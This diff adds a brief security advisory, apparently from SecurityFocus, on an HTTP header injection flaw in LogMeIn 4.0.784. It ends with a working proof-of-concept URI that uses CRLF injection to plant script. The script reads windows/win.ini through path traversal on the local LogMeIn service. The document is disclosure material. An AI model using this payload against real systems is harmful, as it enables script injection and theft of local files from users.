@@ -1,0 +1,11 @@
+source: http://www.securityfocus.com/bid/35236/info
+
+LogMeIn is prone to a vulnerability that allows attackers to inject arbitrary HTTP headers because it fails to sufficiently sanitize input.
+
+By inserting arbitrary headers into an HTTP response, attackers may be able to launch various attacks, including cross-site request forgery, cross-site scripting, and HTTP-request smuggling.
+
+LogMeIn 4.0.784 is vulnerable; other versions may also be affected.
+
+The following example URI is available:
+http://securethoughts.com/2009/06/multiple-vulnerabilities-in-logmein-web-interface-can-be-used-to-control-your-computer-and-steal-arbitary-files/#viewSource
+http://www.example.com/cfgadvanced.html?op=update&DisconnectExisting=1&NoHttpCompr=1&CrashDumpInfo=0&lang=en-US%0D%0A%0D%0A%3Chtml%3E%3Cbody%3E%3C/body%3E%3CSCRIPT%3Evar%20ifr%3Dnull%3Bfunction%20al%28%29%7Bvar%20str%3D%28window.frames%5B0%5D.document.body.innerHTML%20%7C%7C%20ifr.contentDocument.documentElement.innerHTML%29%3Balert%28str.substring%28%28str.toLowerCase%28%29%29.indexOf%28%22%3Clegend%3E%22%2C400%29%29%29%3B%7D%20if%28window.location.href.match%28/.*cfgad.*/%29%29%7Bifr%3Ddocument.createElement%28%22iframe%22%29%3Bifr.src%3D%22https%3A//localhost%3A2002/logs.html%3Flog%3D../../../windows/win.ini%22%3Bdocument.body.appendChild%28ifr%29%3BsetTimeout%28%22al%28%29%22%2C4000%29%3B%7D%3C/script%3E%3C%21-- 
